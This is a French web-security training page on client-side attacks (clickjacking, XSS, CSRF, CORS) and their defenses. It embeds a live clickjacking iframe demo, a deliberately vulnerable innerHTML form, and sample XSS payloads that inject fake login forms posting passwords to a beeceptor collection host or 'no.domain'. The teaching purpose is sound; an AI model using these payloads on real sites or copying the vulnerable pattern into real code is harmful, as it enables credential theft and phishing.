<!doctype html><html lang=fr-fr><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=preload as=font href=https://securite-applicative.dufau.re/fonts/vendor/jost/jost-v4-latin-regular.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://securite-applicative.dufau.re/fonts/vendor/jost/jost-v4-latin-500.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://securite-applicative.dufau.re/fonts/vendor/jost/jost-v4-latin-700.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://securite-applicative.dufau.re/fonts/KaTeX_Main-Regular.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://securite-applicative.dufau.re/fonts/KaTeX_Math-Italic.woff2 type=font/woff2 crossorigin><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><link rel=stylesheet href=https://securite-applicative.dufau.re/main.0fe80c6b892b5b4a23c1976293e62f35444473be7ab2a9d0d6c743d298714e2a8ee5f1852906bd82d55e7a170852cf37ae8d96a46683034d7aea1341500a89b4.css integrity="sha512-D+gMa4krW0ojwZdik+YvNUREc756sqnQ1sdD0phxTiqO5fGFKQa9gtVeehcIUs83ro2WpGaDA0166hNBUAqJtA==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><meta name=robots content="index, follow"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><title>Injections de code (client) - Formation sécurité applicative</title><meta name=description content="Les attaques basées sur des croisements de domaines"><link rel=canonical href=https://securite-applicative.dufau.re/docs/failles/injection-client/><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="og:title" content="Injections de code (client)"><meta property="og:description" content="Les attaques basées sur des croisements de domaines"><meta property="og:url" content="https://securite-applicative.dufau.re/docs/failles/injection-client/"><meta property="og:site_name" content="Formation sécurité applicative"><meta property="og:image" content="https://securite-applicative.dufau.re/doks.png"><meta property="og:image:alt" content="Formation sécurité applicative"><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@getdoks"><meta name=twitter:creator content="@henkverlinde"><meta name=twitter:title content="Injections de code (client)"><meta name=twitter:description content="Les attaques basées sur des croisements de domaines"><meta name=twitter:image content="https://securite-applicative.dufau.re/doks.png"><meta name=twitter:image:alt content="Injections de code (client)"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://securite-applicative.dufau.re/#/schema/organization/1","name":"Doks","url":"https://securite-applicative.dufau.re/","sameAs":["https://twitter.com/getdoks","https://github.com/h-enk/doks"],"logo":{"@type":"ImageObject","@id":"https://securite-applicative.dufau.re/#/schema/image/1","url":"https://securite-applicative.dufau.re/logo-doks.png","width":512,"height":512,"caption":"Doks"},"image":{"@id":"https://securite-applicative.dufau.re/#/schema/image/1"}},{"@type":"WebSite","@id":"https://securite-applicative.dufau.re/#/schema/website/1","url":"https://securite-applicative.dufau.re/","name":"Formation sécurité applicative","description":"Doks is a Hugo theme for building secure, fast, and SEO-ready documentation websites, which you can easily update and customize.","publisher":{"@id":"https://securite-applicative.dufau.re/#/schema/organization/1"}},{"@type":"WebPage","@id":"https://securite-applicative.dufau.re/docs/failles/injection-client/","url":"https://securite-applicative.dufau.re/docs/failles/injection-client/","name":"Injections de code (client)","description":"Les attaques basées sur des croisements de domaines","isPartOf":{"@id":"https://securite-applicative.dufau.re/#/schema/website/1"},"about":{"@id":"https://securite-applicative.dufau.re/#/schema/organization/1"},"datePublished":"0001-01-01T00:00:00CET","dateModified":"0001-01-01T00:00:00CET","breadcrumb":{"@id":"https://securite-applicative.dufau.re/docs/failles/injection-client/#/schema/breadcrumb/1"},"primaryImageOfPage":{"@id":"https://securite-applicative.dufau.re/docs/failles/injection-client/#/schema/image/2"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://securite-applicative.dufau.re/docs/failles/injection-client/"]}]},{"@type":"BreadcrumbList","@id":"https://securite-applicative.dufau.re/docs/failles/injection-client/#/schema/breadcrumb/1","name":"Breadcrumbs","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://securite-applicative.dufau.re/","url":"https://securite-applicative.dufau.re/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"https://securite-applicative.dufau.re/docs/","url":"https://securite-applicative.dufau.re/docs/","name":"Docs"}},{"@type":"ListItem","position":3,"item":{"@type":"WebPage","@id":"https://securite-applicative.dufau.re/docs/failles/","url":"https://securite-applicative.dufau.re/docs/failles/","name":"Failles"}},{"@type":"ListItem","position":4,"item":{"@id":"https://securite-applicative.dufau.re/docs/failles/injection-client/"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://securite-applicative.dufau.re/#/schema/article/1","headline":"Injections de code (client)","description":"Les attaques basées sur des croisements de domaines","isPartOf":{"@id":"https://securite-applicative.dufau.re/docs/failles/injection-client/"},"mainEntityOfPage":{"@id":"https://securite-applicative.dufau.re/docs/failles/injection-client/"},"datePublished":"0001-01-01T00:00:00CET","dateModified":"0001-01-01T00:00:00CET","author":{"@id":"https://securite-applicative.dufau.re/#/schema/person/2"},"publisher":{"@id":"https://securite-applicative.dufau.re/#/schema/organization/1"},"image":{"@id":"https://securite-applicative.dufau.re/docs/failles/injection-client/#/schema/image/2"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Person","@id":"https://securite-applicative.dufau.re/#/schema/person/2","name":"Henk Verlinde","sameAs":["https://twitter.com/henkverlinde","https://www.linkedin.com/in/henkverlinde/","https://github.com/h-enk"]}]},{"@context":"https://schema.org","@graph":[{"@type":"ImageObject","@id":"https://securite-applicative.dufau.re/docs/failles/injection-client/#/schema/image/2","url":"https://securite-applicative.dufau.re/doks.png","contentUrl":"https://securite-applicative.dufau.re/doks.png","caption":"Injections de code (client)"}]}]}</script><meta name=theme-color content="#fff"><link rel=apple-touch-icon sizes=180x180 href=https://securite-applicative.dufau.re/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://securite-applicative.dufau.re/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://securite-applicative.dufau.re/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=https://securite-applicative.dufau.re/site.webmanifest></head><body class="docs single"><div class=header-bar></div><header class="navbar navbar-expand-md navbar-light doks-navbar"><nav class="container-xxl flex-wrap flex-md-nowrap" aria-label="Main navigation"><a class="navbar-brand p-0 me-auto" href=/ aria-label="Formation sécurité applicative">Formation sécurité applicative</a>
<button class="btn btn-menu d-block d-md-none order-5" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasDoks aria-controls=offcanvasDoks aria-label="Open main menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button><div class="offcanvas offcanvas-end border-0 py-md-1" tabindex=-1 id=offcanvasDoks data-bs-backdrop=true aria-labelledby=offcanvasDoksLabel><div class="header-bar d-md-none"></div><div class="offcanvas-header d-md-none"><h2 class="h5 offcanvas-title ps-2" id=offcanvasDoksLabel><a class=text-dark href=/>Formation sécurité applicative</a></h2><button type=button class="btn-close text-reset me-2" data-bs-dismiss=offcanvas aria-label="Close main menu"></button></div><div class="offcanvas-body px-4"><h3 class="h6 text-uppercase mb-3 d-md-none">Main</h3><ul class="nav flex-column flex-md-row ms-md-n3"></ul><hr class="text-black-50 my-4 d-md-none"><h3 class="h6 text-uppercase mb-3 d-md-none">Socials</h3><ul class="nav flex-column flex-md-row ms-md-auto me-md-n5 pe-md-2"><li class=nav-item><a class="nav-link ps-0 py-1" href=https://github.com/clement-dufaure/securite-applicative><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg><small class="ms-2 d-md-none">GitHub</small></a></li></ul></div></div><button id=mode class="btn btn-link order-md-1" type=button aria-label="Toggle user interface mode">
<span class=toggle-dark><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></span><span class=toggle-light><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></span></button></nav></header><nav class="doks-subnavbar py-2 sticky-lg-top" aria-label="Secondary navigation"><div class="container-xxl d-flex align-items-md-center"><form class="doks-search position-relative flex-grow-1 me-auto"><input id=search class="form-control is-search" type=search placeholder="Search docs..." aria-label="Search docs..." autocomplete=off><div id=suggestions class="shadow bg-white rounded d-none"></div></form><button class="btn doks-sidebar-toggle d-lg-none ms-3 order-3 collapsed" type=button data-bs-toggle=collapse data-bs-target=#doks-docs-nav aria-controls=doks-docs-nav aria-expanded=false aria-label="Toggle documentation navigation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="doks doks-expand" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Expand</title><polyline points="7 13 12 18 17 13"/><polyline points="7 6 12 11 17 6"/></svg><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="doks doks-collapse" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Collapse</title><polyline points="17 11 12 6 7 11"/><polyline points="17 18 12 13 7 18"/></svg></button></div></nav><div class=container-xxl><aside class=doks-sidebar><nav id=doks-docs-nav class="collapse d-lg-none" aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-0b79795d3efc95b9976c7c5b933afce2 aria-expanded=false>
Introduction</button><div class=collapse id=section-0b79795d3efc95b9976c7c5b933afce2><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/intro/grands-principes/>Les grands principes de la sécurité</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-53c7b2c8457704ee6f16cb2e6434b744 aria-expanded=true>
Failles applicatives</button><div class="collapse show" id=section-53c7b2c8457704ee6f16cb2e6434b744><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/failles/intro/>Qu'est ce qu'une faille applicative ?</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/failles/sql/>Injections de code (serveur)</a></li><li><a class="docs-link rounded active" href=https://securite-applicative.dufau.re/docs/failles/injection-client/>Injections de code (client)</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-2badb7fa3e862298a650909d45c5066b aria-expanded=false>
Https</button><div class=collapse id=section-2badb7fa3e862298a650909d45c5066b><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/https/fonctionnement/>Fontionnement de https</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/https/pratique/>Mise en pratique de https</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-c48fb18ab9d562b42911cddcdc0c855f aria-expanded=false>
Authentification</button><div class=collapse id=section-c48fb18ab9d562b42911cddcdc0c855f><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/principes/>Les grands principes de l'authentification</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/oidc/oidc/>Fonctionnement d'OpenID Connect</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/java/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/js/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/oidc/keycloak/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/oidc/oidc-java/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/oidc/oidc-js/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/saml/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/tomcat/></a></li></ul></div></li></ul></nav></aside></div><div class="wrap container-xxl" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-0b79795d3efc95b9976c7c5b933afce2 aria-expanded=false>
Introduction</button><div class=collapse id=section-0b79795d3efc95b9976c7c5b933afce2><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/intro/grands-principes/>Les grands principes de la sécurité</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-53c7b2c8457704ee6f16cb2e6434b744 aria-expanded=true>
Failles applicatives</button><div class="collapse show" id=section-53c7b2c8457704ee6f16cb2e6434b744><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/failles/intro/>Qu'est ce qu'une faille applicative ?</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/failles/sql/>Injections de code (serveur)</a></li><li><a class="docs-link rounded active" href=https://securite-applicative.dufau.re/docs/failles/injection-client/>Injections de code (client)</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-2badb7fa3e862298a650909d45c5066b aria-expanded=false>
Https</button><div class=collapse id=section-2badb7fa3e862298a650909d45c5066b><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/https/fonctionnement/>Fontionnement de https</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/https/pratique/>Mise en pratique de https</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-c48fb18ab9d562b42911cddcdc0c855f aria-expanded=false>
Authentification</button><div class=collapse id=section-c48fb18ab9d562b42911cddcdc0c855f><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/principes/>Les grands principes de l'authentification</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/oidc/oidc/>Fonctionnement d'OpenID Connect</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/java/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/js/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/oidc/keycloak/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/oidc/oidc-java/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/oidc/oidc-js/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/saml/></a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/tomcat/></a></li></ul></div></li></ul></nav></div><nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#les-attaques-basées-sur-des-croisements-de-domaines>Les attaques basées sur des croisements de domaines</a><ul><li><a href=#le-clickjacking>Le clickjacking</a></li><li><a href=#linjection-de-code-côté-client->L&rsquo;injection de code&mldr; côté client !</a></li></ul></li><li><a href=#les-attaques-csrf>Les attaques CSRF</a></li><li><a href=#la-protection-cors>La protection CORS</a></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9 mx-xl-auto"><h1>Injections de code (client)</h1><p class=lead></p><nav class=d-xl-none aria-label="Quaternary navigation"><div class=page-links><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#les-attaques-basées-sur-des-croisements-de-domaines>Les attaques basées sur des croisements de domaines</a><ul><li><a href=#le-clickjacking>Le clickjacking</a></li><li><a href=#linjection-de-code-côté-client->L&rsquo;injection de code&mldr; côté client !</a></li></ul></li><li><a href=#les-attaques-csrf>Les attaques CSRF</a></li><li><a href=#la-protection-cors>La protection CORS</a></li></ul></nav></div></nav><h2 id=les-attaques-basées-sur-des-croisements-de-domaines>Les attaques basées sur des croisements de domaines <a href=#les-attaques-bas%c3%a9es-sur-des-croisements-de-domaines class=anchor aria-hidden=true>#</a></h2><p>Objectifs :</p><ul><li>Un utilisateur connecté sur un site légitime envoie des données à un site attaquant</li><li>Un site attaquant force un utilisateur à faire une opération non souhaité sur le site légitime</li></ul><h3 id=le-clickjacking>Le clickjacking <a href=#le-clickjacking class=anchor aria-hidden=true>#</a></h3><p>Vous avez Gagné<br><button>Cliquez la</button></p><iframe id=t title=t width=1500 height=1000 style=opacity:.00000000001;position:relative;top:-5em;left:-10em src=http://localhost:8180/admin/master/console/#/realms/test/clients></iframe><p>Vous avez Gagné, regardez mieux<br><button>Cliquez la</button></p><iframe id=t title=t width=1500 height=1000 style=opacity:.3;position:relative;top:-5em;left:-10em src=http://localhost:8180/admin/master/console/#/realms/test/clients></iframe><p><strong>Les <code>&lt;iframe></code></strong></p><ul><li>Principe légitime à la base : afficher une page web sur une autre page web</li><li>Comportements détournés</li><li>Clickjacking = on cache une iframe par dessus un bouton aparemment légitime</li></ul><pre><code class=language-html>&lt;iframe style=&quot;opacity: 0&quot; src=&quot;https://le-site-des-admins&quot;&gt;
</code></pre><p><strong>XFS Cross Frame Scripting</strong> : principe général d&rsquo;attaque consistant à injecter le site légitime sur le site du pirate via un iframe</p><p><strong>Attaque INDIRECTE</strong></p><p>=> <strong>Protection PASSIVE</strong></p><ul><li>on va dire au navigateur que le site n&rsquo;a aucune raison légitime d&rsquo;être dans une iframe<ul><li>Des entêtes standards existent :</li></ul><pre><code>X-Frame-Options:&lt;DENY|SAMEORIGIN|ALLOW-FROM https://example.com/&gt;;
</code></pre><ul><li>On filtre donc les origines qui ont le droit d&rsquo;afficher l&rsquo;iframe</li><li>/!\ Absence d&rsquo;entête = autorisé de n&rsquo;importe quel source</li></ul></li></ul><h3 id=linjection-de-code-côté-client->L&rsquo;injection de code&mldr; côté client ! <a href=#linjection-de-code-c%c3%b4t%c3%a9-client- class=anchor aria-hidden=true>#</a></h3><script>var fonction=function(){myUl=document.getElementById("myUl"),myTxt=document.getElementById("scriptEvil").value;var e=document.createElement("LI");e.innerHTML=myTxt,myUl.appendChild(e)}</script><blockquote><h4 id=école-municipale-de-kelkepare>École municipale de Kelkepare <a href=#%c3%a9cole-municipale-de-kelkepare class=anchor aria-hidden=true>#</a></h4><p><strong>Inscription d&rsquo;un nouvel élève</strong></p><p>Prénom : <input id=scriptEvil type=text> <button onclick=fonction()>Inscrire l&rsquo;élève</button></p><ul id=myUl></ul></blockquote><p>Et si j&rsquo;écrit dans le formulaire :</p><pre><code>&lt;form action=&quot;https://securite-applicative.free.beeceptor.com&quot; &gt;Entrez votre mot de passe : &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;button type=&quot;submit&quot; formtarget=&quot;_blank&quot;&gt;Me connecter&lt;/button&gt;&lt;/form&gt;
</code></pre><p>Que se passe-t-il ici ? : https://beeceptor.com/console/securite-applicative</p><p>Déclinable à souhait&mldr;</p><pre><code>&lt;button onclick=&quot;window.location='https://securite-applicative.free.beeceptor.com'&quot; &gt;Continuer&lt;/button&gt;
</code></pre><p>On peut ainsi forcer un utilisateur a provoquer ces modifications du DOM ou tout autre action</p><ul><li>En le redirigeant sur la page avec des paramètres de requete trafiqués</li><li>En stockant en base un code qui va être réaffiché</li></ul><p>On peut ainsi rajouter ce genre de code sur la page de l&rsquo;utilisateur</p><pre><code class=language-html>&lt;script&gt;document.location=&quot;https://no.domain&quot;&lt;/script&gt;
</code></pre><pre><code class=language-html>&lt;script&gt;
document.getElementsByTagName(&quot;body&quot;)[0].innerHTML(&quot;
&lt;form action='https://no.domain' &gt;
&lt;br&gt;Connectez vous !&lt;br&gt;
&lt;input type='text' name='email'&gt;
&lt;input type='password' name='mot de passe'&gt;
&lt;input type='submit' value='Connexion'&gt;
&lt;/form&gt;
&quot;)
&lt;/script&gt;
</code></pre><p>On parle de <strong>XSS (Cross-Site Scripting)</strong></p><p><strong>Pourquoi ?</strong></p><ul><li>Vol de données, en particulier des cookies de session (<a href=/securite-applicative/digressions.html#/la-session-http>explications</a>)</li><li>Redirection malveillante</li></ul><p><strong>Comment ?</strong></p><ul><li>Consiste à injecter du code et en particulier des script dans une page web (<strong>donc éxécuté par l&rsquo;utilisateur dans son navigateur</strong>)</li><li>L&rsquo;attaquant fournit une requête vers un site légitime mais dont le contenu injecte le code</li><li>L&rsquo;attaquant peut aussi profiter d&rsquo;une non validation des données persistantes (BDD)</li></ul><p><strong>Plusieurs types de XSS</strong></p><ul><li>Injection &ldquo;en direct&rdquo; par le serveur, on parle de reflected XSS</li><li>On l&rsquo;appelle DOM XSS, si elle consiste à modifier le DOM via un script</li><li>Pire, XSS Stored : le pirate arrive à écrire ce code dans une base de données ou dans un fichier local. Il n&rsquo;a même plus besoin de fournir un lien trafiqué à l&rsquo;utilisateur.</li></ul><p><strong>Attaque INDIRECTE</strong>
=> <strong>Protection PASSIVE</strong> .. et un peu <strong>ACTIVE</strong></p><p><strong>Sécurité active :</strong></p><ul><li>Vérifier les entrées utilisateurs !</li><li>Echapper caractères spéciaux HTML (utiliser au maximum les sécurités internes des framework, sinon des fonctions existent déjà dans les principaux langages, par exemple <code>${fn:escapeXml(string)}</code> dans une EL en JSP)</li></ul><p><strong>Sécurité passive :</strong></p><ul><li><a href=https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html>Résumé des headers</a></li><li>Content Security Policy (CSP) <a href=https://developer.mozilla.org/fr/docs/Web/HTTP/CSP>Prez</a> <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy>Spec</a></li><li>(deprecated) <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection>X-XSS-Protection</a></li></ul><p><strong>Compléments pour la protection des cookies</strong></p><ul><li>Forcer les cookies à être &ldquo;secure&rdquo; (utilisable en https uniquement), &ldquo;httpOnly&rdquo; (non utilisable dans les scripts)</li><li>Précision : il s&rsquo;agit de sécurité <strong>déclarative</strong> dont la mise en oeuvre est à la charge du navigateur</li></ul><h2 id=les-attaques-csrf>Les attaques CSRF <a href=#les-attaques-csrf class=anchor aria-hidden=true>#</a></h2><p>CSRF = Cross-Site Request Forgery</p><ul><li><p>scénario : Le pirate souhaite effectuer une opération en votre nom. Pour cela il vous fait cliquer sur un lien ou un formulaire qui pointe vers un formulaire du site cible. Si vous êtes authentifié sur le cible cible, l&rsquo;action s&rsquo;effectue en votre nom. La vulnérabilité existe sur les authentifications basées sur des cookies ou sur des authentifications sso.</p></li><li><p>On ne cherche pas à empécher une acton malveillante en soi</p></li><li><p>On cherche à empécher un utilisateur de faire une opération légitime mais forcée par le pirate. On veut s&rsquo;assurer que l&rsquo;utilisateur réalise son opération en pleine conscience.</p></li></ul><p><strong>Protections :</strong></p><ul><li><p>Vérifier les entrées utilisateurs ?</p></li><li><p>Ici, l&rsquo;action à bloquer est légitime&mldr;</p></li><li><p>Faire en sorte qu&rsquo;à chaque appel d&rsquo;un vrai formulaire du site, un jeton à usage unique soit ajouté. Le serveur pourra ainsi s&rsquo;assurer de la cohérence de la requête</p></li><li><p>Des bibliothèques peuvent aider à cette protection : Spring security, pac4j</p></li><li><p>Il faut alors ajouter dans chaque formulaire le jeton en hidden</p></li></ul><pre><code class=language-html>&lt;form action=&quot;/monActionAdmin&quot;
  method=&quot;post&quot;&gt;
  &lt;input type=&quot;submit&quot;
    value=&quot;Faire l'opération sensible&quot; /&gt;
  &lt;input type=&quot;hidden&quot;
    name=&quot;${_csrf.parameterName}&quot;
    value=&quot;${_csrf.token}&quot;/&gt;
&lt;/form&gt;
</code></pre><ul><li>Principe tout POST ne contenant pas ce paramètre se soldera par une 403</li><li>Potentiellement pas nécessaire sur tout le site</li><li>Pour lever la protection en spring security:</li></ul><pre><code class=language-java>http.csrf().ignoringAntMatchers(&quot;/saml/**&quot;); // l'ignorer sur certaines url
http.csrf().disable(); // l'ignorer complètement
</code></pre><h2 id=la-protection-cors>La protection CORS <a href=#la-protection-cors class=anchor aria-hidden=true>#</a></h2><p>CSRF et applis &ldquo;modernes&rdquo; :
Frontend JS + Backend Java</p><ul><li>Pas de formulaire côté serveur</li><li>Des requêtes isolée, pas de cookie mais authentification par jeton</li><li>Si je sers &ldquo;presque&rdquo; le même service javascript, si l&rsquo;admin se connecte à mon service, je peux lui faire réaliser toutes les requêtes que je souhaite</li><li>Protection = vérifier l&rsquo;url où l&rsquo;admin a récupéré le script</li></ul><p>CORS = Cross Over Resource Sharing</p><p>Scénario d&rsquo;attaque :</p><ul><li>J&rsquo;arrive sur un site pirate, qui déclenche un script récupérant une information sur le site cible, par exemple un site interne inaccessible d&rsquo;Internet. L&rsquo;information est ainsi chargée sur la page et la suite du script peut par exemple la renvoyer au pirate.</li></ul><p>Contre-attaque :</p><ul><li>Seul le navigateur sait le site réel où il a récupéré le site</li><li>Sur tout navigateur (récent), un script éxécuté par le client et appelant une ressource externe effectuera une vérification CORS</li><li>=> La requête ne fonctionnera que si le site externe renvoit un entête Access-Control-Allow-Origin correspond au domaine du site source</li></ul><p><em>Le site dit : voici l&rsquo;url des sites qui peuvent m&rsquo;appeler</em></p><p>Les navigateurs envoient systématiquement et automatiquement l&rsquo;entête <code>Origin</code> (à moins d&rsquo;utiliser Netscape 8 ou IE 6)</p><p><strong>Le navigateur n&rsquo;autorise pas la modification de cet entete par script</strong></p><ul><li><p>Pour les requêtes GET et POST &ldquo;simple&rdquo;, supposées sans effets de bord (application/x-www-form-urlencoded,multipart/form-data,text/plain) : la requête est directement envoyée mais le résultat ne s&rsquo;affiche qu&rsquo;en cas de validation de CORS</p></li><li><p>Pour les autres requêtes (avec effets de bord), le navigateur envoie préalablement une requête OPTION, vérifie CORS, et n&rsquo;exécute la requête qu&rsquo;en cas de validation</p></li><li><p>!!! Les navigateurs vont maintenant plus loin et font la même vérification OPTION pour ces requêtes</p></li><li><p>C&rsquo;est donc le serveur qui a la charge de lire l&rsquo;entête <code>Origin</code>, de répondre ou non selon le contenu</p></li><li><p>Le serveur DOIT ajouter l&rsquo;entete <code>Access-Control-Allow-Origin</code> en cas de succès</p></li><li><p>Par défaut un serveur ne va bien sûr rien renvoyer et sera donc impossible à appeler par script</p></li><li><p>On peut envisager de renvoyer <code>Access-Control-Allow-Origin: *</code> si le site ne fournit que des données publiques non sensibles</p></li></ul><p>Domaine au sens CORS :</p><ul><li><p>Un domaine signifie dans ce contexte un triplet (protocole, nom de domaine, port).</p></li><li><p>http://localhost:8080 n&rsquo;est pas le même domaine que https://localhost:8443 et le domaine https://localhost (sous entendu port 443) est encore différent</p></li><li><p>Un script lance une requête vers un autre domaine que celui où il est exécuté, typiquement via un XMLHttpRequest().</p></li><li><p>Le navigateur ajoute l&rsquo;entete Origin à la requête</p></li><li><p>Cet entête n&rsquo;est pas modifiable par script</p></li></ul><pre><code>Origin: https://localhost:8443
